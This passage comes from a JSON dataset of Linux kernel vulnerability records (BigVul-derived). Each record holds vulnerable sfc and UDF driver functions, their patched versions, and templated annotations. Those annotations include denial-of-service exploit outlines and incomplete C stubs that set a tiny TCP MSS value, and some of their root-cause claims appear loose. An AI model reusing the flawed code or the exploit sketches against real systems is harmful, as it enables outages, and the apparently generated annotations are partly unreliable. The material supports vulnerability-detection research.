error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tprintf(\"server is waiting to receive data...\\n\");\n\tmsg.msg_name = &fromAddr;\n\n\t/*\n\t * I add 16 to sizeof(fromAddr), ie 32,\n\t * and pay attention to the definition of fromAddr,\n\t * recvmsg() will overwrite sock_fd,\n\t * since kernel will copy 32 bytes to userspace.\n\t *\n\t * If you just use sizeof(fromAddr), it works fine.\n\t * */\n\tmsg.msg_namelen = sizeof(fromAddr) + 16;\n\t/* msg.msg_namelen = sizeof(fromAddr); */\n\tmsg.msg_iov = &iov;\n\tmsg.msg_iovlen = 1;\n\tmsg.msg_iov->iov_base = recvBuffer;\n\tmsg.msg_iov->iov_len = 128;\n\tmsg.msg_control = 0;\n\tmsg.msg_controllen = 0;\n\tmsg.msg_flags = 0;\n\n\twhile (1) {\n\t\tprintf(\"old socket fd=%d\\n\", sock_fd);\n\t\tif (recvmsg(sock_fd, &msg, 0) == -1) {\n\t\t\tperror(\"recvmsg() error\\n\");\n\t\t\tclose(sock_fd);\n\t\t\texit(1);\n\t\t}\n\t\tprintf(\"server received data from client:%s\\n\", recvBuffer);\n\t\tprintf(\"msg.msg_namelen=%d\\n\", msg.msg_namelen);\n\t\tprintf(\"new socket fd=%d\\n\", sock_fd);\n\t\tstrcat(recvBuffer, \"--data from server\");\n\t\tif (sendmsg(sock_fd, &msg, 0) == -1) {\n\t\t\tperror(\"sendmsg()\\n\");\n\t\t\tclose(sock_fd);\n\t\t\texit(1);\n\t\t}\n\t}\n\n\tclose(sock_fd);\n\treturn 0;\n}\n\nSigned-off-by: Weiping Pan <wpan@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-189",
        "CVE": "CVE-2012-3412",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "drivers/net/ethernet/sfc/efx.c": "static int efx_probe_all(struct efx_nic *efx)\n{\n\tint rc;\n\n\trc = efx_probe_nic(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create NIC\\n\");\n\t\tgoto fail1;\n\t}\n\n\trc = efx_probe_port(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create port\\n\");\n \t\tgoto fail2;\n \t}\n \n \tefx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n \trc = efx_probe_channels(efx);\n \tif (rc)\n\t\tgoto fail3;\n\n\trc = efx_probe_filters(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev,\n\t\t\t  \"failed to create filter tables\\n\");\n\t\tgoto fail4;\n\t}\n\n\treturn 0;\n\n fail4:\n\tefx_remove_channels(efx);\n fail3:\n\tefx_remove_port(efx);\n fail2:\n\tefx_remove_nic(efx);\n fail1:\n\treturn rc;\n}\n"
        },
        "vulnerabilities": "The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3412\n\n[Mandatory] Title: CVE-2012-3412 / CWE-189:\nLinux Kernel sfc Driver DMA Descriptor Consumption DoS\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-08-17\n\n[Optional] Affected products/versions:\nLinux kernel before 3.2.30\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-189 / CVE-2012-3412 - Numeric Errors leading to DMA descriptor exhaustion\n[Mandatory] Summary:\nThe vulnerability exists in the sfc (Solarflare Solarstorm) driver's network packet handling function. Crafted TCP packets with small MSS values can trigger DMA descriptor consumption, leading to network-controller outage. This occurs when the driver processes packets without proper validation of queue sizes against minimum requirements.\n[Mandatory] Root cause:\nInsufficient validation of DMA queue size parameters in efx_probe_all(), allowing descriptor exhaustion with crafted small packet sizes.\n[Mandatory] Attack Surface:\nNetwork interface controller driver (kernel-space)\n[Mandatory] Impact Summary:\nRemote denial of service (network controller outage)\n[Optional] Trigger / Attack vector:\nCrafted TCP packets with small MSS values\n[Mandatory] Key code/struct excerpt (minimal):\nstatic int efx_probe_all(struct efx_nic *efx)\n{\n    int rc;\n\n    rc = efx_probe_nic(efx);\n    if (rc) {\n        netif_err(efx, probe, efx->net_dev, \"failed to create NIC\\n\");\n        goto fail1;\n    }\n\n    efx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n    rc = efx_probe_channels(efx);\n    if (rc)\n        goto fail3;\n}\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nNetwork packet processing via TCP stack\n\n[Mandatory] Exploit primitive(s) available:\nResource exhaustion (DMA descriptor pool)\n\n[Mandatory] Exploitability summary (1 sentence):\nRemote attackers can trigger the vulnerability by sending specially crafted TCP packets to a vulnerable system.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Craft TCP packets with small MSS values\n- Send packets to target system with vulnerable sfc driver\n- Trigger DMA descriptor allocation\n- Exhaust queue resources\n- Cause network controller outage\n\n[Mandatory] Exploitation Example script payload code:\n#include <stdio.h>\n#include <string.h>\n#include <netinet/ip.h>\n#include <netinet/tcp.h>\n\nvoid craft_packet(void) {\n    struct tcphdr tcp;\n    memset(&tcp, 0, sizeof(tcp));\n    tcp.source = htons(12345);\n    tcp.dest = htons(80);\n    tcp.doff = 5;\n    tcp.syn = 1;\n    \n    // Set small MSS value in TCP options\n    unsigned char options[] = {\n        0x02, 0x04, 0x01, 0x00  // MSS = 256\n    };\n    // Send packet to target...\n}\n\nFix\n[Mandatory] Fix code:\nBUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);\nif (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {\n    rc = -EINVAL;\n    goto fail3;\n}\nefx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n\n[Mandatory] Fix summary:\nAdded minimum queue size validation to prevent descriptor exhaustion from small packet sizes.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c\n\n[Optional] Patch Analysis:\nField: PatchType\nBounds check added\nQueue size parameter validation\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review similar network driver initialization code\n- Check for other queue size allocation points\n\n[Optional] Likely variants/impact (one line):\nOther network drivers may have similar queue sizing vulnerabilities",
        "tests": "NA",
        "solutions": "static int efx_probe_all(struct efx_nic *efx)\n{\n\tint rc;\n\n\trc = efx_probe_nic(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create NIC\\n\");\n\t\tgoto fail1;\n\t}\n\n\trc = efx_probe_port(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev, \"failed to create port\\n\");\n \t\tgoto fail2;\n \t}\n \n\tBUILD_BUG_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_RXQ_MIN_ENT);\n\tif (WARN_ON(EFX_DEFAULT_DMAQ_SIZE < EFX_TXQ_MIN_ENT(efx))) {\n\t\trc = -EINVAL;\n\t\tgoto fail3;\n\t}\n \tefx->rxq_entries = efx->txq_entries = EFX_DEFAULT_DMAQ_SIZE;\n \trc = efx_probe_channels(efx);\n \tif (rc)\n\t\tgoto fail3;\n\n\trc = efx_probe_filters(efx);\n\tif (rc) {\n\t\tnetif_err(efx, probe, efx->net_dev,\n\t\t\t  \"failed to create filter tables\\n\");\n\t\tgoto fail4;\n\t}\n\n\treturn 0;\n\n fail4:\n\tefx_remove_channels(efx);\n fail3:\n\tefx_remove_port(efx);\n fail2:\n\tefx_remove_nic(efx);\n fail1:\n\treturn rc;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-08-17",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_id": "68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_message": "sfc: Fix maximum number of TSO segments and minimum TX queue size\n\n[ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]\n\nCurrently an skb requiring TSO may not fit within a minimum-size TX\nqueue.  The TX queue selected for the skb may stall and trigger the TX\nwatchdog repeatedly (since the problem skb will be retried after the\nTX reset).  This issue is designated as CVE-2012-3412.\n\nSet the maximum number of TSO segments for our devices to 100.  This\nshould make no difference to behaviour unless the actual MSS is less\nthan about 700.  Increase the minimum TX queue size accordingly to\nallow for 2 worst-case skbs, so that there will definitely be space\nto add an skb after we wake a queue.\n\nTo avoid invalidating existing configurations, change\nefx_ethtool_set_ringparam() to fix up values that are too small rather\nthan returning -EINVAL.\n\nSigned-off-by: Ben Hutchings <bhutchings@solarflare.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-189",
        "CVE": "CVE-2012-3412",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "drivers/net/ethernet/sfc/efx.c": "static int efx_register_netdev(struct efx_nic *efx)\n{\n\tstruct net_device *net_dev = efx->net_dev;\n\tstruct efx_channel *channel;\n\tint rc;\n\n\tnet_dev->watchdog_timeo = 5 * HZ;\n \tnet_dev->irq = efx->pci_dev->irq;\n \tnet_dev->netdev_ops = &efx_netdev_ops;\n \tSET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);\n \n \t/* Clear MAC statistics */\n \tefx->mac_op->update_stats(efx);\n\tmemset(&efx->mac_stats, 0, sizeof(efx->mac_stats));\n\n\trtnl_lock();\n\n\trc = dev_alloc_name(net_dev, net_dev->name);\n\tif (rc < 0)\n\t\tgoto fail_locked;\n\tefx_update_name(efx);\n\n\trc = register_netdevice(net_dev);\n\tif (rc)\n\t\tgoto fail_locked;\n\n\tefx_for_each_channel(channel, efx) {\n\t\tstruct efx_tx_queue *tx_queue;\n\t\tefx_for_each_channel_tx_queue(tx_queue, channel)\n\t\t\tefx_init_tx_queue_core_txq(tx_queue);\n\t}\n\n\t/* Always start with carrier off; PHY events will detect the link */\n\tnetif_carrier_off(efx->net_dev);\n\n\trtnl_unlock();\n\n\trc = device_create_file(&efx->pci_dev->dev, &dev_attr_phy_type);\n\tif (rc) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"failed to init net dev attributes\\n\");\n\t\tgoto fail_registered;\n\t}\n\n\treturn 0;\n\nfail_locked:\n\trtnl_unlock();\n\tnetif_err(efx, drv, efx->net_dev, \"could not register net dev\\n\");\n\treturn rc;\n\nfail_registered:\n\tunregister_netdev(net_dev);\n\treturn rc;\n}\n"
        },
        "vulnerabilities": "The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3412\n\n[Mandatory] Title: CVE-2012-3412 / CWE-189:\nLinux kernel sfc driver DoS via crafted TCP packets\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-08-17\n\n[Optional] Affected products/versions:\nLinux kernel before 3.2.30\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-189: Numeric Errors (DoS)\n[Mandatory] Summary:\nThe sfc (Solarflare Solarstorm) driver in the Linux kernel is vulnerable to a denial of service attack where crafted TCP packets with small MSS values can cause DMA descriptor consumption and network-controller outage. The vulnerability exists in the network device registration function which lacks proper packet size validation.\n[Mandatory] Root cause:\nUnchecked TCP Maximum Segment Size (MSS) values in packet processing leading to descriptor exhaustion.\n[Mandatory] Attack Surface:\nNetwork interface (via crafted TCP packets)\n[Mandatory] Impact Summary:\nRemote denial of service (network-controller outage)\n[Optional] Trigger / Attack vector:\nCrafted TCP packets with small MSS values\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nstatic int efx_register_netdev(struct efx_nic *efx)\n{\n\tstruct net_device *net_dev = efx->net_dev;\n\t...\n\trc = dev_alloc_name(net_dev, net_dev->name);\n\tif (rc < 0)\n\t\tgoto fail_locked;\n\tefx_update_name(efx);\n\t...\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nNetwork interface accepting TCP packets\n\n[Mandatory] Exploit primitive(s) available:\nResource exhaustion (DMA descriptor consumption)\n\n[Mandatory] Exploitability summary (1 sentence):\nRemote attackers can cause persistent DoS by sending specially crafted TCP packets with small MSS values.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Craft TCP packets with abnormally small MSS values\n- Target a system using the vulnerable sfc driver\n- Send packets repeatedly to exhaust DMA descriptors\n- Causes network controller outage until system reset\n- Persistent effect until malicious traffic stops\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <netinet/tcp.h>\n#include <netinet/ip.h>\n\n// Simplified example - would need root privileges\nvoid send_malicious_tcp(int sockfd, struct sockaddr_in *target) {\n    char packet[1500];\n    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));\n    \n    // Set maliciously small MSS value\n    unsigned short mss = 1;  // Dangerously small value\n    tcp->doff = 6;  // TCP header with options\n    *((unsigned short *)((void *)tcp + sizeof(struct tcphdr))) = htons(0x0202);  // MSS option kind+length\n    *((unsigned short *)((void *)tcp + sizeof(struct tcphdr) + 2)) = htons(mss);\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nstatic int efx_register_netdev(struct efx_nic *efx)\n{\n\tstruct net_device *net_dev = efx->net_dev;\n\t...\n\tnet_dev->gso_max_segs = EFX_TSO_MAX_SEGS;\n\t...\n}\n```\n\n[Mandatory] Fix summary:\nAdded GSO (Generic Segmentation Offload) maximum segments setting to prevent descriptor exhaustion from small MSS values.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c\n\n[Optional] Patch Analysis:\nField: PatchType (e.g., bounds check added, logic refactor, feature removal)\nValidation added for TSO segment limits\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other network drivers for similar MSS validation issues\n- Check for related descriptor exhaustion vulnerabilities\n\n[Optional] Likely variants/impact (one line):\nOther network drivers may have similar TCP packet processing issues",
        "tests": "NA",
        "solutions": "static int efx_register_netdev(struct efx_nic *efx)\n{\n\tstruct net_device *net_dev = efx->net_dev;\n\tstruct efx_channel *channel;\n\tint rc;\n\n\tnet_dev->watchdog_timeo = 5 * HZ;\n \tnet_dev->irq = efx->pci_dev->irq;\n \tnet_dev->netdev_ops = &efx_netdev_ops;\n \tSET_ETHTOOL_OPS(net_dev, &efx_ethtool_ops);\n\tnet_dev->gso_max_segs = EFX_TSO_MAX_SEGS;\n \n \t/* Clear MAC statistics */\n \tefx->mac_op->update_stats(efx);\n\tmemset(&efx->mac_stats, 0, sizeof(efx->mac_stats));\n\n\trtnl_lock();\n\n\trc = dev_alloc_name(net_dev, net_dev->name);\n\tif (rc < 0)\n\t\tgoto fail_locked;\n\tefx_update_name(efx);\n\n\trc = register_netdevice(net_dev);\n\tif (rc)\n\t\tgoto fail_locked;\n\n\tefx_for_each_channel(channel, efx) {\n\t\tstruct efx_tx_queue *tx_queue;\n\t\tefx_for_each_channel_tx_queue(tx_queue, channel)\n\t\t\tefx_init_tx_queue_core_txq(tx_queue);\n\t}\n\n\t/* Always start with carrier off; PHY events will detect the link */\n\tnetif_carrier_off(efx->net_dev);\n\n\trtnl_unlock();\n\n\trc = device_create_file(&efx->pci_dev->dev, &dev_attr_phy_type);\n\tif (rc) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"failed to init net dev attributes\\n\");\n\t\tgoto fail_registered;\n\t}\n\n\treturn 0;\n\nfail_locked:\n\trtnl_unlock();\n\tnetif_err(efx, drv, efx->net_dev, \"could not register net dev\\n\");\n\treturn rc;\n\nfail_registered:\n\tunregister_netdev(net_dev);\n\treturn rc;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-08-17",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_id": "68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_message": "sfc: Fix maximum number of TSO segments and minimum TX queue size\n\n[ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]\n\nCurrently an skb requiring TSO may not fit within a minimum-size TX\nqueue.  The TX queue selected for the skb may stall and trigger the TX\nwatchdog repeatedly (since the problem skb will be retried after the\nTX reset).  This issue is designated as CVE-2012-3412.\n\nSet the maximum number of TSO segments for our devices to 100.  This\nshould make no difference to behaviour unless the actual MSS is less\nthan about 700.  Increase the minimum TX queue size accordingly to\nallow for 2 worst-case skbs, so that there will definitely be space\nto add an skb after we wake a queue.\n\nTo avoid invalidating existing configurations, change\nefx_ethtool_set_ringparam() to fix up values that are too small rather\nthan returning -EINVAL.\n\nSigned-off-by: Ben Hutchings <bhutchings@solarflare.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-189",
        "CVE": "CVE-2012-3412",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "drivers/net/ethernet/sfc/ethtool.c": "static int efx_ethtool_set_ringparam(struct net_device *net_dev,\n \t\t\t\t     struct ethtool_ringparam *ring)\n {\n \tstruct efx_nic *efx = netdev_priv(net_dev);\n \n \tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n \t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n \t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n \t\treturn -EINVAL;\n \n\tif (ring->rx_pending < EFX_MIN_RING_SIZE ||\n\t    ring->tx_pending < EFX_MIN_RING_SIZE) {\n \t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"TX and RX queues cannot be smaller than %ld\\n\",\n\t\t\t  EFX_MIN_RING_SIZE);\n \t\treturn -EINVAL;\n \t}\n \n\treturn efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);\n }\n"
        },
        "vulnerabilities": "The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3412\n\n[Mandatory] Title: CVE-2012-3412 / CWE-189:\nLinux kernel sfc driver DoS via crafted TCP packets\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2013-08-17\n\n[Optional] Affected products/versions:\nLinux kernel before 3.2.30\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-189: Numeric Errors\nCVE-2012-3412: Denial of service via DMA descriptor consumption\n[Mandatory] Summary:\nThe vulnerability exists in the sfc (Solarflare Solarstorm) driver's ring parameter validation function. The driver fails to properly validate minimum TX queue sizes, allowing specially crafted TCP packets with small MSS values to cause DMA descriptor exhaustion. This leads to a network controller outage by consuming all available descriptors.\n[Mandatory] Root cause:\nInsufficient validation of minimum TX queue size parameters leading to potential DMA descriptor exhaustion.\n[Mandatory] Attack Surface:\nNetwork-facing via crafted TCP packets\n[Mandatory] Impact Summary:\nRemote denial of service (network controller outage)\n[Optional] Trigger / Attack vector:\nSpecially crafted TCP packets with small MSS values\n[Mandatory] Key code/struct excerpt (minimal):\nstatic int efx_ethtool_set_ringparam(struct net_device *net_dev,\n\t\t\t\t     struct ethtool_ringparam *ring)\n{\n\tstruct efx_nic *efx = netdev_priv(net_dev);\n\n\tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n\t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n\t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n\t\treturn -EINVAL;\n\n\tif (ring->rx_pending < EFX_MIN_RING_SIZE ||\n\t    ring->tx_pending < EFX_MIN_RING_SIZE) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"TX and RX queues cannot be smaller than %ld\\n\",\n\t\t\t  EFX_MIN_RING_SIZE);\n\t\treturn -EINVAL;\n\t}\n\n\treturn efx_realloc_channels(efx, ring->rx_pending, ring->tx_pending);\n}\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nNetwork interface processing TCP packets\n\n[Mandatory] Exploit primitive(s) available:\nResource exhaustion (DMA descriptors)\n\n[Mandatory] Exploitability summary (1 sentence):\nRemote attackers can trigger the vulnerability by sending specially crafted TCP packets to exhaust DMA descriptors.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create TCP packets with artificially small MSS values\n- Target a system with the vulnerable sfc driver\n- Send packets repeatedly to exhaust DMA descriptors\n- Causes network controller outage\n- Persistent until system restart or driver reset\n\n[Mandatory] Exploitation Example script payload code:\nNA\n\nFix\n[Mandatory] Fix code:\nstatic int efx_ethtool_set_ringparam(struct net_device *net_dev,\n\t\t\t\t     struct ethtool_ringparam *ring)\n{\n\tstruct efx_nic *efx = netdev_priv(net_dev);\n\tu32 txq_entries;\n\n\tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n\t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n\t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n\t\treturn -EINVAL;\n\n\tif (ring->rx_pending < EFX_RXQ_MIN_ENT) {\n\t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"RX queues cannot be smaller than %u\\n\",\n\t\t\t  EFX_RXQ_MIN_ENT);\n\t\treturn -EINVAL;\n\t}\n\n\ttxq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));\n\tif (txq_entries != ring->tx_pending)\n\t\tnetif_warn(efx, drv, efx->net_dev,\n\t\t\t   \"increasing TX queue size to minimum of %u\\n\",\n\t\t\t   txq_entries);\n\n\treturn efx_realloc_channels(efx, ring->rx_pending, txq_entries);\n}\n\n[Mandatory] Fix summary:\nThe patch implements proper validation for minimum TX queue sizes and automatically adjusts values that are too small rather than rejecting them, preventing DMA descriptor exhaustion.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c\n\n[Optional] Patch Analysis:\nField: PatchType (bounds check added)\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review similar ring parameter validation in other network drivers\n- Check for other cases of MMS-related resource exhaustion\n- Analyze minimum size validations in DMA-related operations\n\n[Optional] Likely variants/impact (one line):\nSimilar issues may exist in other network drivers' DMA queue handling.",
        "tests": "NA",
        "solutions": "static int efx_ethtool_set_ringparam(struct net_device *net_dev,\n \t\t\t\t     struct ethtool_ringparam *ring)\n {\n \tstruct efx_nic *efx = netdev_priv(net_dev);\n\tu32 txq_entries;\n \n \tif (ring->rx_mini_pending || ring->rx_jumbo_pending ||\n \t    ring->rx_pending > EFX_MAX_DMAQ_SIZE ||\n \t    ring->tx_pending > EFX_MAX_DMAQ_SIZE)\n \t\treturn -EINVAL;\n \n\tif (ring->rx_pending < EFX_RXQ_MIN_ENT) {\n \t\tnetif_err(efx, drv, efx->net_dev,\n\t\t\t  \"RX queues cannot be smaller than %u\\n\",\n\t\t\t  EFX_RXQ_MIN_ENT);\n \t\treturn -EINVAL;\n \t}\n \n\ttxq_entries = max(ring->tx_pending, EFX_TXQ_MIN_ENT(efx));\n\tif (txq_entries != ring->tx_pending)\n\t\tnetif_warn(efx, drv, efx->net_dev,\n\t\t\t   \"increasing TX queue size to minimum of %u\\n\",\n\t\t\t   txq_entries);\n\n\treturn efx_realloc_channels(efx, ring->rx_pending, txq_entries);\n }\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-08-17",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_id": "68cb695ccecf949d48949e72f8ce591fdaaa325c",
        "commit_message": "sfc: Fix maximum number of TSO segments and minimum TX queue size\n\n[ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]\n\nCurrently an skb requiring TSO may not fit within a minimum-size TX\nqueue.  The TX queue selected for the skb may stall and trigger the TX\nwatchdog repeatedly (since the problem skb will be retried after the\nTX reset).  This issue is designated as CVE-2012-3412.\n\nSet the maximum number of TSO segments for our devices to 100.  This\nshould make no difference to behaviour unless the actual MSS is less\nthan about 700.  Increase the minimum TX queue size accordingly to\nallow for 2 worst-case skbs, so that there will definitely be space\nto add an skb after we wake a queue.\n\nTo avoid invalidating existing configurations, change\nefx_ethtool_set_ringparam() to fix up values that are too small rather\nthan returning -EINVAL.\n\nSigned-off-by: Ben Hutchings <bhutchings@solarflare.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-119",
        "CVE": "CVE-2012-3400",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/udf/super.c": "static int udf_load_logicalvol(struct super_block *sb, sector_t block,\n\t\t\t       struct kernel_lb_addr *fileset)\n{\n\tstruct logicalVolDesc *lvd;\n\tint i, j, offset;\n\tuint8_t type;\n\tstruct udf_sb_info *sbi = UDF_SB(sb);\n \tstruct genericPartitionMap *gpm;\n \tuint16_t ident;\n \tstruct buffer_head *bh;\n \tint ret = 0;\n \n \tbh = udf_read_tagged(sb, block, block, &ident);\n \tif (!bh)\n \t\treturn 1;\n \tBUG_ON(ident != TAG_IDENT_LVD);\n \tlvd = (struct logicalVolDesc *)bh->b_data;\n \n \tret = udf_sb_alloc_partition_maps(sb, le32_to_cpu(lvd->numPartitionMaps));\n \tif (ret)\n \t\tgoto out_bh;\n \n \tfor (i = 0, offset = 0;\n\t     i < sbi->s_partitions && offset < le32_to_cpu(lvd->mapTableLength);\n \t     i++, offset += gpm->partitionMapLength) {\n \t\tstruct udf_part_map *map = &sbi->s_partmaps[i];\n \t\tgpm = (struct genericPartitionMap *)\n\t\t\t\t&(lvd->partitionMaps[offset]);\n\t\ttype = gpm->partitionMapType;\n\t\tif (type == 1) {\n\t\t\tstruct genericPartitionMap1 *gpm1 =\n\t\t\t\t(struct genericPartitionMap1 *)gpm;\n\t\t\tmap->s_partition_type = UDF_TYPE1_MAP15;\n\t\t\tmap->s_volumeseqnum = le16_to_cpu(gpm1->volSeqNum);\n\t\t\tmap->s_partition_num = le16_to_cpu(gpm1->partitionNum);\n\t\t\tmap->s_partition_func = NULL;\n\t\t} else if (type == 2) {\n\t\t\tstruct udfPartitionMap2 *upm2 =\n\t\t\t\t\t\t(struct udfPartitionMap2 *)gpm;\n\t\t\tif (!strncmp(upm2->partIdent.ident, UDF_ID_VIRTUAL,\n\t\t\t\t\t\tstrlen(UDF_ID_VIRTUAL))) {\n\t\t\t\tu16 suf =\n\t\t\t\t\tle16_to_cpu(((__le16 *)upm2->partIdent.\n\t\t\t\t\t\t\tidentSuffix)[0]);\n\t\t\t\tif (suf < 0x0200) {\n\t\t\t\t\tmap->s_partition_type =\n\t\t\t\t\t\t\tUDF_VIRTUAL_MAP15;\n\t\t\t\t\tmap->s_partition_func =\n\t\t\t\t\t\t\tudf_get_pblock_virt15;\n\t\t\t\t} else {\n\t\t\t\t\tmap->s_partition_type =\n\t\t\t\t\t\t\tUDF_VIRTUAL_MAP20;\n\t\t\t\t\tmap->s_partition_func =\n\t\t\t\t\t\t\tudf_get_pblock_virt20;\n\t\t\t\t}\n\t\t\t} else if (!strncmp(upm2->partIdent.ident,\n\t\t\t\t\t\tUDF_ID_SPARABLE,\n\t\t\t\t\t\tstrlen(UDF_ID_SPARABLE))) {\n\t\t\t\tuint32_t loc;\n\t\t\t\tstruct sparingTable *st;\n\t\t\t\tstruct sparablePartitionMap *spm =\n\t\t\t\t\t(struct sparablePartitionMap *)gpm;\n\n\t\t\t\tmap->s_partition_type = UDF_SPARABLE_MAP15;\n\t\t\t\tmap->s_type_specific.s_sparing.s_packet_len =\n\t\t\t\t\t\tle16_to_cpu(spm->packetLength);\n\t\t\t\tfor (j = 0; j < spm->numSparingTables; j++) {\n\t\t\t\t\tstruct buffer_head *bh2;\n\n\t\t\t\t\tloc = le32_to_cpu(\n\t\t\t\t\t\tspm->locSparingTable[j]);\n\t\t\t\t\tbh2 = udf_read_tagged(sb, loc, loc,\n\t\t\t\t\t\t\t     &ident);\n\t\t\t\t\tmap->s_type_specific.s_sparing.\n\t\t\t\t\t\t\ts_spar_map[j] = bh2;\n\n\t\t\t\t\tif (bh2 == NULL)\n\t\t\t\t\t\tcontinue;\n\n\t\t\t\t\tst = (struct sparingTable *)bh2->b_data;\n\t\t\t\t\tif (ident != 0 || strncmp(\n\t\t\t\t\t\tst->sparingIdent.ident,\n\t\t\t\t\t\tUDF_ID_SPARING,\n\t\t\t\t\t\tstrlen(UDF_ID_SPARING))) 